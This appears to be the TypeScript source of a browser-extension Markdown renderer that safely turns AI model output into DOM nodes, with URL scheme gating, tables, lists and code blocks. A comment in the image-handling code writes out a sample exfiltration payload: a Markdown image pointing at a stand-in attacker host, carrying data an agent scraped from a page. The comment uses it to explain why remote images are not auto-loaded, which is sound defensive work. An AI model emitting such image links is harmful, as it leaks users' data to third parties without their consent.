// CSP-safe Markdown → DOM renderer.
//
// Builds nodes ONLY with createElement/createTextNode/textContent (never innerHTML), so there is no
// HTML-injection surface even on untrusted model output, and link/image URLs are scheme-gated.
//
// The previous renderer handled a thin slice of Markdown and mangled the rest: GFM tables collapsed into
// one run-on line of pipes, nested lists flattened, `[**bold** link](u)` showed literal asterisks,
// `foo_bar_baz` rendered as foo<em>bar</em>baz, images left a stray `!`, and every hard line break was
// joined away. Models emit tables and nested lists constantly, so those were not edge cases — they were
// the normal case rendering badly.

const AUTOLINK = /^(https?:\/\/[^\s<>()]+[^\s<>().,;:!?'"])/;

function safeUrl(url: string, allowImage = false): string | null {
  const trimmed = url.trim().replace(/^<|>$/g, '');
  // Only absolute references. A relative or protocol-relative one re-resolves against the panel's own
  // chrome-extension:// origin, so `[docs](/about)` would render as a citation that can only ever
  // open a dead extension URL. Rendering the label as plain text is the honest outcome.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(trimmed)) return null;
  try {
    const parsed = new URL(trimmed);
    const scheme = parsed.protocol;
    if (scheme === 'http:' || scheme === 'https:' || scheme === 'mailto:') return trimmed;
    // Inline images are a common way to render small diagrams; data: is safe for them because the
    // element is an <img>, which cannot execute. It is NOT allowed for links.
    if (allowImage && scheme === 'data:' && /^data:image\//i.test(trimmed)) return trimmed;
    return null;
  } catch {
    return null;
  }
}

/** Text with no Markdown meaning left in it. */
function text(value: string): Text {
  return document.createTextNode(value);
}

/**
 * Inline parser.
 *
 * Recursive rather than a single flat regex, so emphasis, links and strikethrough can CONTAIN other
 * inline markup. Code spans are matched first and never re-parsed, which is what stops backticked
 * examples like `**not bold**` from being rendered as markup.
 */
function inline(parent: Node, src: string): void {
  let i = 0;
  let plain = '';
  const flush = (): void => {
    if (plain) {
      parent.appendChild(text(plain));
      plain = '';
    }
  };
  const wrap = (tag: string, content: string): void => {
    flush();
    const el = document.createElement(tag);
    inline(el, content);
    parent.appendChild(el);
  };

  while (i < src.length) {
    const rest = src.slice(i);
    const ch = src[i]!;

    // Backslash escape: the next character is literal, never markup.
    if (ch === '\\' && i + 1 < src.length && /[\\`*_{}[\]()#+\-.!|~>]/.test(src[i + 1]!)) {
      plain += src[i + 1];
      i += 2;
      continue;
    }

    // Code span — highest precedence, contents are never interpreted.
    if (ch === '`') {
      const fence = /^(`+)/.exec(rest)![1]!;
      const end = src.indexOf(fence, i + fence.length);
      if (end !== -1) {
        flush();
        const code = document.createElement('code');
        code.textContent = src.slice(i + fence.length, end).replace(/^ | $/g, '');
        parent.appendChild(code);
        i = end + fence.length;
        continue;
      }
    }

    // Image: ![alt](src)
    //
    // Only an inline data: image is drawn. Everything rendered here is model text, and the model's text
    // is derived from the page it just read, so `![](https://evil.tld/p?d=<what the agent scraped>)` is
    // an exfiltration channel that needs no click at all: the profile's own network stack would issue
    // the GET the moment the answer appears. A remote image therefore becomes the same click-through
    // link a `[label](url)` gets, so the request only happens if the human decides it should. The
    // manifest's `img-src 'self' data:` enforces the same rule one layer down.
    const image = /^!\[([^\]]*)\]\(\s*([^\s)]+)(?:\s+"[^"]*")?\s*\)/.exec(rest);
    if (image) {
      const url = safeUrl(image[2]!, true);
      flush();
      if (url && /^data:/i.test(url)) {
        const img = document.createElement('img');
        img.setAttribute('src', url);
        img.setAttribute('alt', image[1]!);
        img.setAttribute('loading', 'lazy');
        parent.appendChild(img);
      } else if (url) {
        const anchor = document.createElement('a');
        anchor.setAttribute('href', url);
        anchor.setAttribute('target', '_blank');
        anchor.setAttribute('rel', 'noreferrer noopener');
        // An empty alt is common on tracking pixels; showing the URL keeps the link visible instead of
        // collapsing to nothing the user cannot see or reason about.
        anchor.textContent = image[1]! || url;
        parent.appendChild(anchor);
      } else {
        parent.appendChild(text(image[1]!));
      }
      i += image[0].length;
      continue;
    }

    // Link: [text](url) — the label is parsed as inline so nested markup survives.
    const link = /^\[([^\]]*)\]\(\s*([^\s)]+)(?:\s+"[^"]*")?\s*\)/.exec(rest);
    if (link) {
      const url = safeUrl(link[2]!);
      flush();
      if (url) {
        const anchor = document.createElement('a');
        anchor.setAttribute('href', url);
        anchor.setAttribute('target', '_blank');
        anchor.setAttribute('rel', 'noreferrer noopener');
        inline(anchor, link[1]!);
        parent.appendChild(anchor);
      } else {
        inline(parent, link[1]!);
      }
      i += link[0].length;
      continue;
    }

    // Bold+italic, bold, strikethrough, then italic — longest delimiter first so `***x***` is not
    // mis-split into bold + a stray asterisk.
    const strong2 = /^\*\*\*([\s\S]+?)\*\*\*/.exec(rest);
    if (strong2) {
      flush();
      const em = document.createElement('em');
      const strong = document.createElement('strong');
      inline(strong, strong2[1]!);
      em.appendChild(strong);
      parent.appendChild(em);
      i += strong2[0].length;
      continue;
    }
    const strong = /^\*\*([\s\S]+?)\*\*/.exec(rest);
    if (strong) {
      wrap('strong', strong[1]!);
      i += strong[0].length;
      continue;
    }
    const strike = /^~~([\s\S]+?)~~/.exec(rest);
    if (strike) {
      wrap('del', strike[1]!);
      i += strike[0].length;
      continue;
    }
    const star = /^\*(?!\s)([\s\S]+?)(?<!\s)\*/.exec(rest);
    if (star) {
      wrap('em', star[1]!);
      i += star[0].length;
      continue;
    }
    // `_` only delimits at a word boundary. Without this, identifiers and URLs (snake_case_name,
    // /a/b_c_d) get chopped into spurious emphasis — a constant annoyance in technical answers.
    if (ch === '_' && (i === 0 || /[\s([{"'—-]/.test(src[i - 1]!))) {
      const under = /^_(?!\s)([\s\S]+?)(?<!\s)_(?![A-Za-z0-9])/.exec(rest);
      if (under) {
        wrap('em', under[1]!);
        i += under[0].length;
        continue;
      }
    }

    // Bare URL → link, so models that paste raw links still produce something clickable.
    if (ch === 'h') {
      const auto = AUTOLINK.exec(rest);
      if (auto) {
        const url = safeUrl(auto[1]!);
        if (url) {
          flush();
          const anchor = document.createElement('a');
          anchor.setAttribute('href', url);
          anchor.setAttribute('target', '_blank');
          anchor.setAttribute('rel', 'noreferrer noopener');
          anchor.textContent = auto[1]!;
          parent.appendChild(anchor);
          i += auto[0].length;
          continue;
        }
      }
    }

    plain += ch;
    i += 1;
  }
  flush();
}

/** Split a GFM table row into cells, honouring escaped pipes. */
function tableCells(row: string): string[] {
  const trimmed = row.trim().replace(/^\|/, '').replace(/\|$/, '');
  const cells: string[] = [];
  let current = '';
  for (let i = 0; i < trimmed.length; i += 1) {
    const ch = trimmed[i]!;
    if (ch === '\\' && trimmed[i + 1] === '|') {
      current += '|';
      i += 1;
      continue;
    }
    if (ch === '|') {
      cells.push(current);
      current = '';
      continue;
    }
    current += ch;
  }
  cells.push(current);
  return cells.map((cell) => cell.trim());
}

const DELIMITER_ROW = /^\s*\|?\s*:?-{1,}:?\s*(\|\s*:?-{1,}:?\s*)*\|?\s*$/;

/**
 * A GFM table starts where a header row is immediately followed by its delimiter row.
 *
 * The delimiter must carry a pipe of its own, or a bare `---` under a sentence containing a pipe
 * would be read as a one-column table instead of the horizontal rule it is.
 */
function startsTable(header: string | undefined, delimiter: string | undefined): boolean {
  return (
    !!header &&
    header.includes('|') &&
    !!delimiter &&
    delimiter.includes('|') &&
    delimiter.includes('-') &&
    DELIMITER_ROW.test(delimiter)
  );
}

function alignments(row: string): Array<'left' | 'center' | 'right' | null> {
  return tableCells(row).map((cell) => {
    const left = cell.startsWith(':');
    const right = cell.endsWith(':');
    if (left && right) return 'center';
    if (right) return 'right';
    if (left) return 'left';
    return null;
  });
}

/** How deeply a list row is indented, in "levels" of two spaces (a tab counts as one level). */
function indentLevel(line: string): number {
  const lead = /^[ \t]*/.exec(line)![0];
  return lead.replace(/\t/g, '  ').length >> 1;
}

const BULLET = /^[ \t]*([-*+])\s+(.*)$/;
const ORDERED = /^[ \t]*(\d{1,9})[.)]\s+(.*)$/;
const TASK = /^\[([ xX])\]\s+(.*)$/;

interface Cursor {
  lines: string[];
  i: number;
}

/** Parse a run of list rows at `level` or deeper into a single ul/ol, recursing for nested rows. */
function parseList(cur: Cursor, level: number): HTMLElement {
  const first = cur.lines[cur.i]!;
  const ordered = ORDERED.test(first) && !BULLET.test(first);
  const list = document.createElement(ordered ? 'ol' : 'ul');
  if (ordered) {
    const start = Number(ORDERED.exec(first)![1]);
    // Without this, a list starting at "3." renders as "1." — the numbers the answer refers to change.
    if (start !== 1) list.setAttribute('start', String(start));
  }

  while (cur.i < cur.lines.length) {
    const line = cur.lines[cur.i]!;
    // Check DEPTH before type: a nested list is very often the other kind (bullets under a numbered
    // step), and testing the parent's type first would end the list at the first nested row.
    if (!BULLET.test(line) && !ORDERED.test(line)) break;
    if (indentLevel(line) < level) break;
    if (indentLevel(line) > level) {
      // Deeper row: nest it inside the item we just added, where it belongs.
      const nested = parseList(cur, indentLevel(line));
      (list.lastElementChild ?? list).appendChild(nested);
      continue;
    }
    // Same depth but the other marker type starts a new sibling list, not another item here.
    const match = ordered ? ORDERED.exec(line) : BULLET.exec(line);
    if (!match) break;

    const item = document.createElement('li');
    let content = match[2]!;
    const task = TASK.exec(content);
    if (task) {
      const box = document.createElement('input');
      box.setAttribute('type', 'checkbox');
      box.setAttribute('disabled', '');
      if (task[1]!.toLowerCase() === 'x') box.setAttribute('checked', '');
      item.appendChild(box);
      item.appendChild(text(' '));
      content = task[2]!;
    }
    inline(item, content);
    list.appendChild(item);
    cur.i += 1;

    // Lazy continuation: an unindented plain line directly under an item belongs to that item.
    while (cur.i < cur.lines.length) {
      const next = cur.lines[cur.i]!;
      if (
        !next.trim() ||
        BULLET.test(next) ||
        ORDERED.test(next) ||
        /^(#{1,6}\s|```|>)/.test(next)
      ) {
        break;
      }
      if (indentLevel(next) < level + 1) break;
      item.appendChild(text(' '));
      inline(item, next.trim());
      cur.i += 1;
    }
  }
  return list;
}

/** A fenced code block, with its language labelled and a copy button. */
function codeBlock(language: string, body: string): HTMLElement {
  const wrapper = document.createElement('div');
  wrapper.className = 'lobee-code';

  const header = document.createElement('div');
  header.className = 'lobee-code-head';
  const label = document.createElement('span');
  label.textContent = language || 'text';
  header.appendChild(label);

  const copy = document.createElement('button');
  copy.setAttribute('type', 'button');
  copy.textContent = 'Copy';
  copy.addEventListener('click', () => {
    void navigator.clipboard?.writeText(body).then(
      () => {
        copy.textContent = 'Copied';
        setTimeout(() => {
          copy.textContent = 'Copy';
        }, 1400);
      },
      () => {
        copy.textContent = 'Failed';
      },
    );
  });
  header.appendChild(copy);
  wrapper.appendChild(header);

  const pre = document.createElement('pre');
  const code = document.createElement('code');
  if (language) code.setAttribute('data-language', language);
  code.textContent = body;
  pre.appendChild(code);
  wrapper.appendChild(pre);
  return wrapper;
}

/**
 * Where a streamed answer stops being able to change shape.
 *
 * Every block ends at a blank line, so text appended after the LAST blank line (one not sitting inside
 * an open fence) can never reparse anything before it. Callers re-render only the part after this
 * offset, which is what keeps a mid-stream text selection — and a code block's Copy button — alive
 * instead of tearing the whole answer down on every token.
 */
export function stableBlockBoundary(src: string): number {
  const text = String(src ?? '');
  let boundary = 0;
  let offset = 0;
  let fence = '';
  for (const line of text.split('\n')) {
    const marker = /^\s*(```+|~~~+)/.exec(line);
    if (fence) {
      if (marker && new RegExp(`^\\s*${fence}+\\s*$`).test(line)) fence = '';
    } else if (marker) {
      fence = marker[1]!.slice(0, 3);
    }
    offset += line.length + 1;
    if (!fence && !line.trim()) boundary = Math.min(offset, text.length);
  }
  return boundary;
}

export function renderMarkdown(src: string): DocumentFragment {
  const frag = document.createDocumentFragment();
  const cur: Cursor = {
    lines: String(src ?? '')
      .replace(/\r\n?/g, '\n')
      .split('\n'),
    i: 0,
  };

  while (cur.i < cur.lines.length) {
    const line = cur.lines[cur.i]!;

    if (!line.trim()) {
      cur.i += 1;
      continue;
    }

    // Fenced code. Tolerates ``` and ~~~, and an unterminated fence (common mid-stream) by running to
    // the end rather than dropping the block.
    const fence = /^\s*(```+|~~~+)\s*([\w+#.-]*)\s*$/.exec(line);
    if (fence) {
      const marker = fence[1]!.slice(0, 3);
      const body: string[] = [];
      cur.i += 1;
      while (
        cur.i < cur.lines.length &&
        !new RegExp(`^\\s*${marker}+\\s*$`).test(cur.lines[cur.i]!)
      ) {
        body.push(cur.lines[cur.i]!);
        cur.i += 1;
      }
      cur.i += 1;
      frag.appendChild(codeBlock(fence[2] ?? '', body.join('\n')));
      continue;
    }

    // GFM table: a header row followed by a delimiter row.
    const next = cur.lines[cur.i + 1];
    if (startsTable(line, next)) {
      const align = alignments(next!);
      const table = document.createElement('table');
      const thead = document.createElement('thead');
      const headRow = document.createElement('tr');
      tableCells(line).forEach((cell, index) => {
        const th = document.createElement('th');
        if (align[index]) th.style.textAlign = align[index]!;
        inline(th, cell);
        headRow.appendChild(th);
      });
      thead.appendChild(headRow);
      table.appendChild(thead);

      const tbody = document.createElement('tbody');
      cur.i += 2;
      while (
        cur.i < cur.lines.length &&
        cur.lines[cur.i]!.includes('|') &&
        cur.lines[cur.i]!.trim()
      ) {
        const tr = document.createElement('tr');
        tableCells(cur.lines[cur.i]!).forEach((cell, index) => {
          const td = document.createElement('td');
          if (align[index]) td.style.textAlign = align[index]!;
          inline(td, cell);
          tr.appendChild(td);
        });
        tbody.appendChild(tr);
        cur.i += 1;
      }
      table.appendChild(tbody);
      // Wide tables must scroll inside the panel, not push the whole conversation sideways.
      const scroller = document.createElement('div');
      scroller.className = 'lobee-table';
      scroller.appendChild(table);
      frag.appendChild(scroller);
      continue;
    }

    const heading = /^(#{1,6})\s+(.*?)\s*#*$/.exec(line);
    if (heading) {
      const el = document.createElement(`h${heading[1]!.length}`);
      inline(el, heading[2]!);
      frag.appendChild(el);
      cur.i += 1;
      continue;
    }

    if (/^\s{0,3}(?:-{3,}|\*{3,}|_{3,})\s*$/.test(line)) {
      frag.appendChild(document.createElement('hr'));
      cur.i += 1;
      continue;
    }

    if (/^\s*>/.test(line)) {
      const inner: string[] = [];
      while (cur.i < cur.lines.length && /^\s*>/.test(cur.lines[cur.i]!)) {
        inner.push(cur.lines[cur.i]!.replace(/^\s*>\s?/, ''));
        cur.i += 1;
      }
      const quote = document.createElement('blockquote');
      // Recurse: a quote can contain lists, code, even a table.
      quote.appendChild(renderMarkdown(inner.join('\n')));
      frag.appendChild(quote);
      continue;
    }

    if (BULLET.test(line) || ORDERED.test(line)) {
      frag.appendChild(parseList(cur, indentLevel(line)));
      continue;
    }

    // Paragraph. Lines are joined with <br> rather than a space, so addresses, verse and any
    // deliberately line-broken content keep their shape.
    const buf: string[] = [line.trim()];
    cur.i += 1;
    while (cur.i < cur.lines.length) {
      const candidate = cur.lines[cur.i]!;
      if (
        !candidate.trim() ||
        /^(#{1,6}\s|\s*(?:```|~~~)|\s*>)/.test(candidate) ||
        BULLET.test(candidate) ||
        ORDERED.test(candidate) ||
        /^\s{0,3}(?:-{3,}|\*{3,}|_{3,})\s*$/.test(candidate) ||
        // Models introduce a table with a sentence and no blank line after it. Absorbing the header
        // into that paragraph is what turned the table back into a run-on line of literal pipes.
        startsTable(candidate, cur.lines[cur.i + 1])
      ) {
        break;
      }
      buf.push(candidate.trim());
      cur.i += 1;
    }
    const p = document.createElement('p');
    buf.forEach((part, index) => {
      if (index > 0) p.appendChild(document.createElement('br'));
      inline(p, part);
    });
    frag.appendChild(p);
  }
  return frag;
}
